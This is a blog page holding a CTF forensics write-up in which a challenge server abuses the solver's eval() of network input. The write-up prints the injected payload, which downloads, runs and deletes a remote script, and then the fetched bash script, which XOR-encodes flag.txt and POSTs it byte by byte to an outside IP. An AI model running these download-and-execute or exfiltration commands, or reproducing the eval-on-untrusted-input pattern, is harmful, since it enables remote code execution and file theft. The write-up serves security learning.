<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="I was trying a beginner CTF challenge and successfully solved it. But it didn&amp;rsquo;t give me the flag. Luckily I have this network capture. Can you investigate?
Attachment: capture.pcapng
nc chals.sekai.team 9000 Connecting to the server via nc we get this:
Welcome to this intro pwntools challenge. I will send you calculations and you will send me the answer Do it 100 times within time limit and you get the flag :) 3 &#43; 7 &amp;gt;&amp;gt;&amp;gt; After noticing that the script require very fast answers I wrote this simple script to automatize the answers:" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://morebaconstrips.github.io/writeups/forensics/eval_me/" />


    <title>
        
            Eval Me :: Gabriele Abbate  â€” Cybersecurity MSc student
        
    </title>





<link rel="stylesheet" href="/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">


    
        <link rel="stylesheet" type="text/css" href="custom.css">
    


    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Eval Me">
<meta itemprop="description" content="I was trying a beginner CTF challenge and successfully solved it. But it didn&rsquo;t give me the flag. Luckily I have this network capture. Can you investigate?
Attachment: capture.pcapng
nc chals.sekai.team 9000 Connecting to the server via nc we get this:
Welcome to this intro pwntools challenge. I will send you calculations and you will send me the answer Do it 100 times within time limit and you get the flag :) 3 &#43; 7 &gt;&gt;&gt; After noticing that the script require very fast answers I wrote this simple script to automatize the answers:"><meta itemprop="datePublished" content="2023-09-18T21:14:12+02:00" />
<meta itemprop="dateModified" content="2023-09-18T21:14:12+02:00" />
<meta itemprop="wordCount" content="449"><meta itemprop="image" content="https://morebaconstrips.github.io/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://morebaconstrips.github.io/" /><meta name="twitter:title" content="Eval Me"/>
<meta name="twitter:description" content="I was trying a beginner CTF challenge and successfully solved it. But it didn&rsquo;t give me the flag. Luckily I have this network capture. Can you investigate?
Attachment: capture.pcapng
nc chals.sekai.team 9000 Connecting to the server via nc we get this:
Welcome to this intro pwntools challenge. I will send you calculations and you will send me the answer Do it 100 times within time limit and you get the flag :) 3 &#43; 7 &gt;&gt;&gt; After noticing that the script require very fast answers I wrote this simple script to automatize the answers:"/>



    <meta property="og:title" content="Eval Me" />
<meta property="og:description" content="I was trying a beginner CTF challenge and successfully solved it. But it didn&rsquo;t give me the flag. Luckily I have this network capture. Can you investigate?
Attachment: capture.pcapng
nc chals.sekai.team 9000 Connecting to the server via nc we get this:
Welcome to this intro pwntools challenge. I will send you calculations and you will send me the answer Do it 100 times within time limit and you get the flag :) 3 &#43; 7 &gt;&gt;&gt; After noticing that the script require very fast answers I wrote this simple script to automatize the answers:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://morebaconstrips.github.io/writeups/forensics/eval_me/" /><meta property="og:image" content="https://morebaconstrips.github.io/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2023-09-18T21:14:12+02:00" />
<meta property="article:modified_time" content="2023-09-18T21:14:12+02:00" />







    <meta property="article:published_time" content="2023-09-18 21:14:12 &#43;0200 CEST" />












    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                gabriele.portfolio.sh</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about">~/about</a></li><li><a href="/projects">~/projects</a></li><li><a href="/writeups">~/writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://morebaconstrips.github.io/writeups/forensics/eval_me/">Eval Me</a></h2>

            
            
            

            <div class="post-content">
                <blockquote>
<p>I was trying a beginner CTF challenge and successfully solved it. But it didn&rsquo;t give me the flag. Luckily I have this network capture. Can you investigate?</p>
</blockquote>
<p>Attachment: capture.pcapng</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc chals.sekai.team <span style="color:#ae81ff">9000</span>
</span></span></code></pre></div><p>Connecting to the server via nc we get this:</p>
<pre tabindex="0"><code>Welcome to this intro pwntools challenge.
I will send you calculations and you will send me the answer
Do it 100 times within time limit and you get the flag :)

3 + 7
&gt;&gt;&gt;
</code></pre><p>After noticing that the script require very fast answers I wrote this simple script to automatize the answers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;chals.sekai.team&#39;</span>, <span style="color:#ae81ff">9000</span>)
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;flag :)</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>):
</span></span><span style="display:flex;"><span>    op <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    print(op)
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(str(eval(op)))
</span></span><span style="display:flex;"><span>    print(r<span style="color:#f92672">.</span>recvline())
</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Reached a certain point in the computation I read that something is going on</p>
<pre tabindex="0"><code>b&#39;__import__(&#34;subprocess&#34;).check_output(&#34;(curl -sL https://shorturl.at/fgjvU -o extract.sh &amp;&amp; chmod +x extract.sh &amp;&amp; bash extract.sh &amp;&amp; rm -f extract.sh)&gt;/dev/null 2&gt;&amp;1||true&#34;,shell=True)\r&#39;
</code></pre><p>The code downloads a script from a website, it executes it and then it deletes it.</p>
<p>curl -sL <a href="https://shorturl.at/fgjvU">https://shorturl.at/fgjvU</a> and I get the following bash script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat flag.txt<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;s3k@1_v3ry_w0w&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46</span>
</span></span><span style="display:flex;"><span>Asc<span style="color:#f92672">()</span> <span style="color:#f92672">{</span> printf <span style="color:#e6db74">&#39;%d&#39;</span> <span style="color:#e6db74">&#34;&#39;</span>$1<span style="color:#e6db74">&#34;</span>; <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>XOREncrypt<span style="color:#f92672">(){</span>
</span></span><span style="display:flex;"><span>    local key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> DataIn<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    local ptr DataOut val1 val2 val3
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#f92672">((</span> ptr<span style="color:#f92672">=</span>0; ptr &lt; <span style="color:#e6db74">${#</span>DataIn<span style="color:#e6db74">}</span>; ptr++ <span style="color:#f92672">))</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        val1<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span> Asc <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>DataIn:$ptr:1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        val2<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span> Asc <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>key:<span style="color:#66d9ef">$((</span> ptr <span style="color:#f92672">%</span> <span style="color:#e6db74">${#</span>key<span style="color:#e6db74">}</span> <span style="color:#66d9ef">))</span>:1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        val3<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span> val1 <span style="color:#f92672">^</span> val2 <span style="color:#66d9ef">))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        DataOut<span style="color:#f92672">+=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;%02x&#39;</span> <span style="color:#e6db74">&#34;</span>$val3<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#f92672">((</span>i<span style="color:#f92672">=</span>0;i&lt;<span style="color:#e6db74">${#</span>DataOut<span style="color:#e6db74">}</span>;i<span style="color:#f92672">+=</span>2<span style="color:#f92672">))</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>DataOut:$i:2<span style="color:#e6db74">}</span>
</span></span><span style="display:flex;"><span>    curl -m 0.5 -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#34;{\&#34;data\&#34;:\&#34;</span>$BYTE<span style="color:#e6db74">\&#34;}&#34;</span> http://35.196.65.151:30899/ &amp;&gt;/dev/null
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>XOREncrypt $KEY $FLAG
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exit <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>This is why the flag cannot be seen after giving all the right answers to the server: the script xors the flag with the key &lsquo;s3k@1_v3ry_w0w&rsquo; and then sends the result one byte at a time to a remote server through a POST call with a JSON payload. Looking at the pcap file we can find the bytes of the xored flag</p>
<pre tabindex="0"><code>20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f
</code></pre><p>Now we only need to xor it again with the same key</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;s3k@1_v3ry_w0w&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Asc<span style="color:#f92672">()</span> <span style="color:#f92672">{</span> printf <span style="color:#e6db74">&#39;%d&#39;</span> <span style="color:#e6db74">&#34;&#39;</span>$1<span style="color:#e6db74">&#34;</span>; <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HexToDec<span style="color:#f92672">()</span> <span style="color:#f92672">{</span> printf <span style="color:#e6db74">&#39;%d&#39;</span> <span style="color:#e6db74">&#34;0x</span>$1<span style="color:#e6db74">&#34;</span>; <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>XORDecrypt<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    local key<span style="color:#f92672">=</span>$KEY DataIn<span style="color:#f92672">=</span>$FLAG
</span></span><span style="display:flex;"><span>    local ptr DataOut val1 val2 val3
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    local ptrs
</span></span><span style="display:flex;"><span>    ptrs<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#f92672">((</span> ptr<span style="color:#f92672">=</span>0; ptr &lt; <span style="color:#e6db74">${#</span>DataIn<span style="color:#e6db74">}</span>/2; ptr++ <span style="color:#f92672">))</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        val1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span> HexToDec <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>DataIn:$ptrs:2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        val2<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span> Asc <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>key:<span style="color:#66d9ef">$((</span> ptr <span style="color:#f92672">%</span> <span style="color:#e6db74">${#</span>key<span style="color:#e6db74">}</span> <span style="color:#66d9ef">))</span>:1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        val3<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span> val1 <span style="color:#f92672">^</span> val2 <span style="color:#66d9ef">))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ptrs<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span>ptrs+2<span style="color:#66d9ef">))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        DataOut<span style="color:#f92672">+=</span><span style="color:#66d9ef">$(</span> printf <span style="color:#ae81ff">\\</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;%o&#34;</span> <span style="color:#e6db74">&#34;</span>$val3<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span> <span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>    printf <span style="color:#e6db74">&#39;%s&#39;</span> <span style="color:#e6db74">&#34;</span>$DataOut<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>XORDecrypt
</span></span></code></pre></div><pre tabindex="0"><code>$ ./decrypt.sh
SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}
</code></pre>
            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.205d491810c28f95aa953fae884e1c27abe13fdf93ec63b882d0036b248d4a6282eb2d134e4e7225c6ad6e86db87b08488a361ca4a7383d01fcff43f3d57b9c3.js" integrity="sha512-IF1JGBDCj5WqlT&#43;uiE4cJ6vhP9&#43;T7GO4gtADaySNSmKC6y0TTk5yJcatbobbh7CEiKNhykpzg9Afz/Q/PVe5ww=="></script>



    </body>
</html>
